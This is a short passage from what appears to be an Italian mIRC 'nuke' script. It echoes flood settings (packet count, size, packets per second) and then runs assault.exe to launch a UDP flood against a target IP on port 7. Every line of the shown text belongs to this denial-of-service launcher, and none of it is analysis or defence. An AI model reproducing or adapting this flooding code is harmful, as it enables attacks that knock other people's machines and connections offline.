n307=    echo 4 -a Tipo: Flood UDP
n308=    echo 4 -a N Pacchetti: %assault.packets
n309=    echo 4 -a Dimensione Pacchetti: %assault.size bytes
n310=    echo 4 -a Pacchetti al Secondo: %assault.pps
n311=    run $mircdirnuke\assault.exe -udp %Assault.IP -packets %assault.packets -size %assault.size -pps %assault.pps -port 7 
